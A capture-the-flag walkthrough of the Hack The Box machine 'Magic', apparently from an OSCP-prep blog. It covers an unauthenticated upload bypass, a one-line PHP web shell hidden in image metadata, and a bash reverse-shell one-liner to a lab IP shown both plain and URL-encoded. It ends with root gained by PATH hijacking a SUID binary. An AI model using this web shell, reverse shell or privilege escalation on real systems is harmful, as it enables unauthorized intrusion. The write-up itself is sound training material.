# Introduction
The hack the box machine "Magic" is a medium machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Acquiring an initial shell as `www-data` on this machine requires knowledge in the areas of diretory brute forcing, image file formats and web server misconfigurations. The privilege escalation requires knowledge about database attacks and exploitation of SUID binaries with relative paths.

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">

By enumerating the target, it is possible to identify a web application for hosting images. It can then be discovered that this web application fails to check that users are authenticated before allowing them to upload files. Consequently, it is possible to upload a legitimate image file with a PHP web shell in a metadata tag. Due to a misconfiguration in the web server, the web server mistakes the image for a PHP file and code execution can be acquired. Once a shell has been obtained, it is possible to leak credentials from a MySQL database. By using these credentials and exploiting a SUID binary, it is possible to compromise the `root` account.

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.85`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that SSH and HTTP are available on port 22 and 80 respectively.

Navigating to [http://10.10.10.185](http://10.10.10.185) in a browser leads us to the page below. This page shows a bunch of uploaded images. However, it seems like the only way to access any functionality of the site is to first log in using the `Login` link at the bottom-left corner.

![frontpage](/assets/{{ imgDir }}/frontpage.png)

If we click the `Login` link, we reach the page [http://10.10.10.185/login.php](http://10.10.10.185/login.php), shown below. Since the extension is `.php` this tells us that the web application is a PHP application. 

![login](/assets/{{ imgDir }}/login.png)

We can check if there are any other pages which we can access without credentials by bruteforcing file names. We can use [ffuf](https://github.com/ffuf/ffuf) to try to guess names of other PHP files, as shown below. We use the `-u` flag to specify the target URL together with an injection point which we define with the keyword `FUZZ`. In addition, we use the `-w` flag to instruct ffuf to use [a wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt) from [SecLists](https://github.com/danielmiessler/SecLists).

From the results, we can see that the only pages returning a `200 OK` are the `index.php` and the `login.php` pages which we already saw. We can also see that requests for the `logout.php` and `upload.php` pages resulted in a `302 Found`, which means that we are redirected to another page. Most probably, this is the login page. However, if we look at the size of the response to the request for the `upload.php` page, we can note that it is suspiciously large. Normally, redirection responses only contain a small number of bytes which indicate where the user should be redirected.

We can use [Burp Suite](https://portswigger.net/burp) to investigate exactly what is going on. To do this, we start Burp Suite, open the built-in chromium browser and navigate to [http://10.10.10.185/upload.php](http://10.10.10.185/upload.php). We then select the `Proxy` tab and the `HTTP history` subtab to see the list of requests that were performed when we requested the `upload.php` page, as shown below.

![history](/assets/{{ imgDir }}/history.png)

If we click the `upload.php` request, Burp Suite displays the request we made to the `upload.php` page together with its response. From the content of the response, we can see that the web application actually returned the upload page despite redirecting us to the login page!

![uploadReq](/assets/{{ imgDir }}/uploadReq.png)

We can not interact with this page in a browser since a browser automatically follows redirects and thus would load the `login.php` page. However, with Burp Suite, we can rewrite the status code of the response to a `200 OK` before it reaches the built-in browser. To do this, we navigate to the `Options` subtab and scroll down to "Match and Replace". Here, we press the `Add` button to bring up a dialog where we can add a new "Match and Replace" rule.

![matchReplace](/assets/{{ imgDir }}/matchReplace.png)

Next, we create a rule that replaces any occurance of `302 Found` with a `200 OK` in any response, as demonstrated below.

![matchReplaceRule](/assets/{{ imgDir }}/matchReplaceRule.png)

We press `OK` and navigate to [http://10.10.10.185/upload.php](http://10.10.10.185/upload.php) in the browser. This time, we are not redirected and we reach a page where we can upload images!

![uploadPage](/assets/{{ imgDir }}/uploadPage.png)

We can try to upload a picture by pressing the cloud icon, selecting an image, and pressing `Upload Image`. In my case, I chose a random cat meme on my computer. 

![hackerCat](/assets/{{ imgDir }}/hackerCat.png)

After the page reloads, we can see a text message stating that the file upload was successful. 

![uploadCat](/assets/{{ imgDir }}/uploadCat.png)

If we go back to the front page [http://10.10.10.185/](http://10.10.10.185/) and scroll, we can find the picture we tried to upload and we thus know that we can upload files!

![uploadedCat](/assets/{{ imgDir }}/uploadedCat.png)

If we right click the image and press `Open image in new tab`, we can see that it was uploaded to the directory `./images/uploads/`.

![imageDir](/assets/{{ imgDir }}/imageDir.png)

Since we can upload files and access them, we could try to upload a PHP web shell to get remote code execution on the host. A minimal PHP web shell
 is shown below. This web shell executes anything passed in a GET parameter named "cmd". 

{% highlight php linenos %}
<?php system($_REQUEST["cmd"]); ?>
{% endhighlight %}

If we save this web shell in a file named "ws.php" and try to upload it, the web application provides us with an error stating that the file type is not allowed.

![onlyImage](/assets/{{ imgDir }}/onlyImage.png)

It appears that the web application is checking that the extension of the uploaded file is a valid image extension. To check for additional limitations, we rename the file to "ws.png" and try to reupload it. This time, we get another error message.

![onlyRealPNG](/assets/{{ imgDir }}/onlyRealPNG.png)

Since the error message is different, we have probably passed the extension filter. However, there seems to be some other filtering mechanism. Sometimes, developers check that the content of an uploaded file corresponds to the file extension. Since we are trying to upload a PHP file with a `.png` extension, the web application is refusing to upload the file as the file content is not matching the extension. In conclusion, we now know that we can only upload valid image files with valid image file extensions. 

However, we can still upload our webshell by hiding it in the metadata of an image. We can display the metadata of an image using `exiftool` as shown below.

We start by executing `cp hackerCat.png evilHackerCat.png` to create a copy of the image. Next, we use `exiftool` to create a metadata tag named "Author" which holds our web shell.

![uploadEvil](/assets/{{ imgDir }}/uploadEvil.png)

If we go back to the `upload.php` page and try to upload our new image, we can see that the web application accepts the image. However, if we visit [http://10.10.10.185/images/uploads/evilHackerCat.png](http://10.10.10.185/images/uploads/evilHackerCat.png) and inspect the response in Burp Suite, we discover that the web application did not execute our PHP code.

![noRCE](/assets/{{ imgDir }}/noRCE.png)

After playing around with different file extensions and file extension combinations, it is possible to discover that images which include the string ".php" anywhere in the filename, are interpreted as PHP code. We can execute `mv evilHackerCat.png evilHackerCat.php.png` to include ".php" in the filename of our malicious image and thus trick the web server into believing that it is a PHP file. After renaming the file and uploading it, navigating to [http://10.10.10.185/images/uploads/evilHackerCat.php.png](http://10.10.10.185/images/uploads/evilHackerCat.php.png) does no longer show us the PHP code, indicating that it is being executed!

![uploadEvil2](/assets/{{ imgDir }}/uploadEvil2.png)
![RCE](/assets/{{ imgDir }}/RCE.png)

If we try to execute a command by navigating to [http://10.10.10.185/images/uploads/evilHackerCat.php.png?cmd=whoami](http://10.10.10.185/images/uploads/evilHackerCat.php.png?cmd=whoami), we can indeed see that we have code execution on the target!

![RCEuser](/assets/{{ imgDir }}/RCEuser.png)

To get a shell on the host, we can use a reverse shell one-liner such as the one below. Note that the IP address here should be the IP address of the network interface which corresponds to the VPN conneciton.

{% highlight plain linenos %}
bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'
{% endhighlight %}

However, we need to be careful with special characters. For example, the ampersand `&` character could cut our command in half since it is used as a delimiter for GET parameters. To ensure that special characters are not being interpreted in any unwanted way, we can URL encode the command using Burp Suite's Decoder tool.

![URLEncode](/assets/{{ imgDir }}/URLEncode.png)

Next, we start a netcat listener on port 443 by executing `nc -lvnp 443` and execute the reverse shell one-liner by visiting [http://10.10.10.185/images/uploads/evilHackerCat.php.png?cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%34%34%33%20%30%3e%26%31%27](http://10.10.10.185/images/uploads/evilHackerCat.php.png?cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%34%34%33%20%30%3e%26%31%27).

After a couple of milliseconds, we get a shell as the `www-data` user which we can upgrade using Python. The next step is to compromise the `root` user. 

# Privilege Escalation

By enumerating files on the system, it is possible to identify a file named "db.php5". This file contains database credentials, as can be seen below.

Unfortunately, the `mysql` command does not exist on the target host. As such, we can not use this binary for database connections and executions of arbitrary SQL queries. However, since the `mysqldump` binary exists, we can dump the entire database and look for sensitive information in the dump. We can use the `--databases`, `-u` and `-p` flags to instruct the binary to dump the database named "Magic" with the credentials we found earlier. In the output of the command, we can see a row of the `Login` table which contains the username "admin" and password "Th3s3usW4sK1ng". At this point, we have acquired two usernames and two passwords. 

{% highlight none linenos %}

{% endhighlight %}

We can check what users exist on the host by checking the `/etc/passwd` file. By doing this, we can conclude that `theseus` is a valid user account but that `admin` isn't. We can use `su` to try to log in to the `thesus` account using the two passwords we leaked earlier. Upon doing this, we discover that the password "Th3s3usW4sK1ng" is correct and we obtain a shell as `theseus`

By executing the command `groups` we can see that the `theseus` user is a member of the `theseus` and `users` group. The latter is a non-standard group and thus it could be interesting to search for directories and files owned by this group. We can do this using the command `find / -group users -exec ls -l {} \; 2>/dev/null`. 

The `-exec ls -l {} \;` portion of the command instructs `find` to execute `ls -l` for each discovered directory and file, to provide us with more information about it. The `2>/dev/null` portion of the command disables error messages by redirecting them to `/dev/null`. This is useful since it is likely that there are many folders that we can not access, which would result in a large number of `permission denied` errors.

From the output of our search, we discover that the file `/bin/sysinfo` has the SUID bit set and is owned by `root`. This means that accounts in the `users` group can execute this binary as the `root` user. If we can trick this binary into handing us a bash shell, we can compromise the `root` account since this bash shell would be running in the context of the `root` user. If we run this binary, we can see that it appears to provide information about the target host. Among other things, it lists CPU info and information about available memory, as can be seen below.

To better understand how this binary works under the hood, we can use ltrace, which shows when dynamic libraries are used. To do this, we simply pass the binary as an argument to the `ltrace` command.

From the output, we can see that the binary executes other binaries using the `popen` function which simply takes a command and executes it in a shell. These binaries are `lshw`, `fdisk`, `cat` and `free`. What is crucial to note here is that the binaries are not specified using absolute paths. This means that the `sysinfo` binary will search for these binary in all directories specified by the `PATH` environment variable.

If we can write an executable to a directory listed in the `PATH` variable, we could trick the `sysinfo` binary into executing our own executable rather than one of the legitimate ones. To do this, we need a directory which we can write to. We can use `/tmp` since it is normally writable by anyone. We can execute `export PATH="/tmp:$PATH"` to add this directory to the beginning of the `PATH` variable as demonstrated below. Since the directories are ordered by priority, the first directory that will be searched will be the `/tmp` directory.

Next, we create a file named "lshw" in the `/tmp` directory and ensure that it contains the command `bash 1>&0 2>&0`. We use `1>&0` and `2>&0` to redirect `STDOUT` and `STDERR` to `STDIN`. Then, we use `chmod` to turn the file into an executable. Note that we choose to name our script "lshw" but that the name can be set to any of the other three binaries as well.

Finally, we execute the `/bin/sysinfo` binary and it grants us a root shell since it mistakingly executes our `lshw` script rather than the legitimate `lshw` binary!
